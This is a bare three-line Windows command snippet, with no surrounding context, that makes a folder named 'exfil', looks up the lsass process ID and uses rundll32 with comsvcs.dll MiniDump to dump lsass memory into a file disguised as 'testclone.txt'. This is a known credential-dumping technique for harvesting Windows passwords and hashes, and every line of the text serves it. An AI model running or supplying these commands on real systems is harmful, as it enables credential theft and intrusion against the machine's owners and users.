Mkdir c:\temp\exfil
$P = get-process lsass |select -expand id
C:\windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll MiniDump $P c:\temp\exfil\testclone.txt full
